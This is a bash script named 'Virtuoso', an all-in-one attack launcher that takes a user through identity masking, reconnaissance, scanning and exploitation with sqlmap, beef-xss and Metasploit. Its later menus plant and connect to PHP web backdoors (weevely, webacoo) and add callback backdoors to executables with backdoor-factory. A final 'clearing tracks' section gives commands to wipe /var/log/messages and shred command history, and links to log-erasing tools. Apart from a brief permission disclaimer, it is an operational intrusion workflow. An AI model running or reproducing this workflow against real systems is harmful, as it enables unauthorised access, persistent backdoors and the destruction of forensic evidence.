#!/bin/bash
clear

echo "Welcome to Virtuoso! Created by Johnny"
echo ""
echo "____   ____.__         __                            "
echo "\   \ /   /|__|_______/  |_ __ __  ____  __________  "
echo " \   Y   / |  \_  __ \   __\  |  \/  _ \/  ___/  _ \ "
echo "  \     /  |  ||  | \/|  | |  |  (  <_> )___ (  <_> )"
echo "   \___/   |__||__|   |__| |____/ \____/____  >____/ "
echo "                                            \/       "
echo ""
echo "PLEASE RUN WITH SYSTEM PRIVILEGE! RECOMMENDED TO RUN TOOL ON KALI!"
echo ""
echo "ENSURE YOU HAVE PERMISSION BEFORE USING THE TOOL!"
echo "WE ARE NOT RESPONSIBLE ON HOW THIS TOOL IS USED!"
echo ""
echo "All in one penetration tool for penetration testing!"
echo "Please enter your target IP address"
echo "Please input one IP address ONLY!" 
read -p 'Target IP Address> ' ip
ifconfig | grep "mtu" | cut -d":" -f 1
echo "Please type in the interface name:"
read -p "interface> " interface


IFS='.' read -r -a array <<< "$ip"

if [ ${#array[@]} -eq 4 ]
then
	for element in "${array[@]}"
	do
		
   		if [[ $element -lt 0 ]] || [[ $element -gt 255 ]]
		then
			echo "IP Address Error, try again!"
			exit 0
	
		fi
	
	done
else
	echo "Sorry the IP address is Invalid!"
	exit 0
fi

echo "Please enter the interface"

proxychains="n"
echo "Masking your identity"
echo "Would you like to see your current private and priavte IP?[y/n]"
read -p"Virtuoso> " option
if [ $option == "y" ]
then
	echo "Your current Public IP address"
	curl https://api.ipify.org
	echo ""
	echo "Your current Private IP address"
	ifconfig | grep "inet" | cut -d":" -f 2
fi   
echo "Would you like to mask your identity?[y/n]"
read -p"Virtuoso> " option
if [ $option == "y" ]
then
	while :
	do
		echo "[1] proxychains (Ensure you have it configured!)"
		echo "[2] ip changer (host only!)"
		echo "[3] macchangr (host only!)"
		echo "[4] Skip to Reconnaissance"
		echo "[5] Quit"
	read -p 'Virtuoso> ' option

	case $option in 
                1)
		echo "Proxychains Selected"
		echo "Proxychains is now enabled!"
		echo "Please take note that not all application will run proxychains!"
		proxychains="y"
		echo "Would you like to do another option? [y/n]"
		read option
		if [ $option == 'n' ]
		then
			break
		fi
		;;
     	2)
		echo "ip changer Selected"
		echo "Please type in the spoofed IP address:"
		read -p "spoofed ip address> " ip
		ifconfig $interface $ip
		echo "Please confirm your changes:"
		ifconfig | grep "inet" | cut -d":" -f 2  
		echo "Would you like to do another option? [y/n]"
        	read option
        	if [ $option == 'n' ]
        	then
                	break
        	fi
		;;
     	3)
		echo "macchanger Selected"
	
		ifconfig | grep "ether" 
                echo "Randomizing MAC address"
		ifconfig $interface down
                macchanger -r $interface
		ifconfig $interface up
                echo "Please confirm your changes:"
                ifconfig | grep "ether" 
		echo "Would you like to do another option? [y/n]"
        	read option
        	if [ $option == 'n' ]
        	then
                	break
        	fi
		;;
        4)
		break
		;;
     	5)
		echo "Quiting Now"
		exit 0
		;;
	esac

	done
fi	



while :
do
echo "Now to the reconnaissance phase"
echo "[1] Whois"
echo "[2] dig"
echo "[3] theHarvester"
echo "[4] Skip to Scanning"
echo "[5] Quit"
read -p 'Virtuoso> ' option

case $option in 
     1)
	echo "Whois Selected"
	echo "Running Whois Now"
	whois $ip
	echo "Would you like to do another recon? [y/n]"
	read option
	if [ $option == 'n' ]
	then
		break
	fi
	;;

     2)
	echo "dig Selected"
	echo "Running dig Now"
	dig $ip
	echo "Would you like to do another recon? [y/n]"
        read option
        if [ $option == 'n' ]
        then
                break
        fi
	;;
     3)
	echo "theHarvester Selected (Only Google)"
	echo "Running theHarvester"
	if [ $proxychains == "y" ]
        then
                proxychains theharvester -d $ip -b google
        else 
                theharvester -d $ip -b google
        fi
	echo "Would you like to do another recon? [y/n]"
        read option
        if [ $option == 'n' ]
        then
                break
        fi
	;;
     4)
	break
	;;
     5)
	echo "Quiting Now"
	exit 0
	;;
esac

done

while :
do
echo "Now to the scanning phase"
echo "[1] nmap"
echo "[2] nmap scripting engine (NSE)"
echo "[3] netdiscover"
echo "[4] masscan (For large network)"
echo "[5] owasp zap"
echo "[6] Metasploit Auxiliary Module (msfconsole)"
echo "[7] Skip to Exploitation"
echo "[8] Quit"
read -p 'Virtuoso> ' option

case $option in 
     1)
	echo "nmap Selected"
	echo "It will find the OS and services running"
	echo "What is the IP address and the range (192.168.0.0/24)"
	read -p"ipaddress> " ipaddr
	echo "What is the scan that you would like to perform (sT)"
	read -p"Type> " type
	echo "What is the intensity of Scan?(1-5)"
	read -p"Intensity> " intensity
	if [ "$proxychains" == "y" ]
        then
                proxychains nmap -$type -T $intensity -e $interface -O -sV $ipaddr
        else 
                nmap -$type -T $intensity -e $interface -O -sV $ipaddr
        fi

	echo "Would you like to do another recon? [y/n]"
	read option
	if [ $option == 'n' ]
	then
		break
	fi
	;;
     2)
	echo "nmap scripting engine (NSE) Selected"
	echo "Listing all the scripts"
	locate *vuln*.nse
	echo "What is script you want to use?(filename)"
	read -p"filename> " filename
	echo "What is the IP address?"
	read -p"ip> " ipaddress
	if [ "$proxychains" == "y" ]
        then
                proxychains nmap --script $filename $ipaddress
        else 
                nmap --script $filename $ipaddress
        fi

	echo "Would you like to do another recon? [y/n]"
	read option
	if [ $option == 'n' ]
	then
		break
	fi
	;;
     3)
	echo "netdiscover Selected"
	echo "Please put in the IP address range (192.168.0.0/24)"
	read -p"IP Range> " range
	echo "Running netdiscover Now"
	echo "Opening in a new Terminal"
        gnome-terminal -- netdiscover -r $range
	echo "Would you like to do another recon? [y/n]"
        read option
        if [ $option == 'n' ]
        then
                break
        fi
	;;
     4)
	echo "masscan Selected"
	echo "Please put in the IP address range (192.168.0.0/24)"
	read -p"IP Range> " range
	echo "Please put in the port to scan"
	read -p"Port> " port
	echo "Running masscan"
	if [ $proxychains == "y" ]
        then
                proxychains masscan -p $port --interface $interface  $range 
        else 
                masscan -p  $port --interface $interface $range
        fi

	echo "Would you like to do another recon? [y/n]"
        read option
        if [ $option == 'n' ]
        then
                break
        fi
	;;
     5)
	echo "Owasp-zap Selected!"
	echo "Running Owasp-zap"
	owasp-zap
	echo "Would you like to do another recon? [y/n]"
        read option
        if [ $option == 'n' ]
        then
                break
        fi
	;;
     6)
	echo "Starting MSFConsole"
	echo "tip: Type search auxiliary"
 	service postgresql start
	gnome-terminal -- msfconsole
        echo "Would you like to do another recon? [y/n]"
        read option
        if [ $option == 'n' ]
        then
                break
        fi
        ;;
     7)
	break
	;;
     8)
	echo "Quiting Now"
	exit 0
	;;
esac
done

while :
do
echo "Now to the Exploitation phase"
echo "[1] metasploit (msfconsole)"
echo "[2] armitage"
echo "[3] beef xss"
echo "[4] sqlmap"
echo "[5] Skip to Maintaining Access"
echo "[6] Quit"
read -p 'Virtuoso> ' option

case $option in 
     1)
	echo "metasploit Selected"
	echo "metasploit with proxychains is currently unavailable."
	echo "Starting MSFConsole"
        service postgresql start
        gnome-terminal -- msfconsole
	echo "Would you like to do another exploitation? [y/n]"
	read option
	if [ $option == 'n' ]
	then
		break
	fi
	;;
     2)
	echo "armitage running"
	armitage
	echo "Would you like to do another exploitation? [y/n]"
        read option
        if [ $option == 'n' ]
        then
                break
        fi
        ;;
     3)
        echo "beef xss running"
	echo "Please wait for a moment while beef is setting up"
	echo "A browser will open soon!"
	echo ""
        beef-xss
        echo "Would you like to do another exploitation? [y/n]"
        read option
        if [ $option == 'n' ]
        then
                break
        fi
        ;;
     4)
        echo "Is it a POST or GET method?(p/g)"
        read -p"Method>" request
	if [ $request == 'p' ]
	then
		echo "Please key in the data"
		read -p"data>" data
		echo "Please key in the url"
		read -p"url>" url
		if [ $proxychains == 'y' ]
		then
			proxychains sqlmap -u"$url" --method=POST --data="$data"
		else
			sqlmap -u"$url" --method=POST --data="$data"
		fi
	else
		echo "Please key in the url with the get"
		read -p"url>" url
		if [ $proxychains == 'y' ]
		then
			proxychains sqlmap -u"$url"
		else
			sqlmap -u"$url"
		fi
	fi
        echo "Would you like to do another exploitation? [y/n]"
        read option
        if [ $option == 'n' ]
        then
                break
        fi
        ;;
     5)
	break
	;;
     6)
	echo "Quiting Now"
	exit 0
	;;
esac

done


while :
do
echo "Now to the Maintaining Access phase"
echo "[1] weevely (PHP Application)"
echo "[2] backdoor factory"
echo "[3] webacoo"
echo "[4] msfconsole (msfvenom)"
echo "[5] Skip to Clearing Tracks"
echo "[6] Quit"
read -p 'Virtuoso> ' option

case $option in 
     1)
	echo "weevely Selected"
	echo "[1] Generate a PHP payload"
	echo "[2] Connect to the target"
	read -p"Option> " choice
	if [ $choice -eq 1 ]
	then
		read -p"Payload Name (without the extension)> " name
		read -p"Password> " password
		echo "Payload will be stored in the / directory"
		weevely generate $password /$name.php
	else
		read -p"Website> " website
		read -p"Password> " password
		echo "Establishing a connection..."
		weevely $website $password
	fi
	echo "Would you like to do another exploitation? [y/n]"
	read option
	if [ $option == 'n' ]
	then
		break
	fi
	;;
     2)
	echo "backdoor factory running"
	echo "Please specify the path to your executable"
	read -p"Path> " path
	echo "Now listing all the exploit..."
	backdoor-factory -f $path -s show
	echo "Please choose the exploit"
	read -p"exploit> " exploit
	echo "Please specify the host IP address"
	read -p"Host IP> " hIP
	echo "Please specify the host PORT"
	read -p"Host Port> " hPort
	backdoor-factory -f $path -H $hIP -P $hPort -s $exploit
	echo "Would you like to do another exploitation? [y/n]"
        read option
        if [ $option == 'n' ]
        then
                break
        fi
        ;;
     3)
        echo "webacoo running"
	echo "[1] Generate the backdoor"
	echo "[2] Connect to the backdoor"
	read -p"Option> " choice
	if [ $choice -eq 1 ]
	then
		echo "Please input your file name"
		read -p"file name> " filename
		echo "Please input the path you want to save your file to: "
		read -p"Path> " path
		echo "Generating... "
		webacoo -g -o $path$filename
	else
		echo "Please input your url with the backdoor"
		read -p"URL> " url
		echo "Webacoo Command List"
		echo "1. ls (Listing)"
		echo "2. uname -a (Print all information)"
		echo "3. free (Display information about free and used memory on the system"
		echo "4. pwd (Print current working directory)"
		echo "5. df (Display the amount of disk space available on the filesystem containing each file name argument)"
		echo "6. w (Display information about machine and their processes"
		echo "7. route (Show manipulate the IP routing table)"
		echo "8. load (Load machine code and initialize new commands."
		echo "9. download (Download file from server)"
		echo "10. cat (Cat to view the file, can only see normal text"
		echo ""
		echo "Connecting... "
		webacoo -t -u $url
	fi
        echo "Would you like to do another exploitation? [y/n]"
        read option
        if [ $option == 'n' ]
        then
                break
        fi
        ;;
     4)
        echo "metasploit Selected"
	echo "metasploit with proxychains is currently unavailable."
	echo "Starting MSFConsole"
        service postgresql start
        gnome-terminal -- msfconsole
	echo "Would you like to do another exploitation? [y/n]"
	read option
	if [ $option == 'n' ]
	then
		break
	fi
	;;
     5)
	break
	;;
     6)
	echo "Quiting Now"
	exit 0
	;;
esac

done

while :
do
echo "Now to the Clearing Track phase"
echo "Always remember to use clearev on Metasploit!"
echo "Consist of download links to get the tools (Auto launch Firefox to download)"
echo "[1] Winzapper (Download)"
echo "[2] clearlogs (Download)"
echo "[3] Linux clearing logs"
echo "[4] Linux clearing commands"
echo "[5] Quit"
read -p 'Virtuoso> ' option

case $option in 
     1)
	echo "Opening Browser to download these application"
	if [ $proxychains == 'y' ]
	then
		proxychains firefox www.ntsecurity.nu/toolbox/winzapper
	else
		firefox www.ntsecurity.nu/toolbox/winzapper
	fi
	echo "Would you like to do another clearing? [y/n]"
	read option
	if [ $option == 'n' ]
	then
		break
	fi
	;;
     2)
	echo "Opening Browser to download these application"
	if [ $proxychains == 'y' ]
	then
		proxychains firefox www.ntsecurity.nu/toolbox/clearlogs
	else
		firefox www.ntsecurity.nu/toolbox/clearlogs
	fi
	echo "Would you like to do another clearing? [y/n]"
	read option
	if [ $option == 'n' ]
	then
		break
	fi
	;;
     3)
	clear
        echo "Recommendation for clearing Linux Logs"
	echo "--------------------------------------"
	echo "1. All logs are stored inside of /var/log/messages"
	echo "Use a text editor to try to delete one by one or use"
	echo "the following command: echo "" > messages"
	echo "This will delete all the logs."
	echo ""
	echo ""
        ;;
     4)
	clear
        echo "Recommendation for clearing Linux History Commands"
	echo "--------------------------------------------------"
	echo "1. Shred all the past command"
	echo "Run the following command: shred -zu /<<path to command"
	echo "history>>. This will prevent the user from seeing the"
	echo "history and try to get piece back the information"
	echo ""
	echo ""
        ;;
     5)
	echo "Quiting Now"
	exit 0
	;;
esac

done




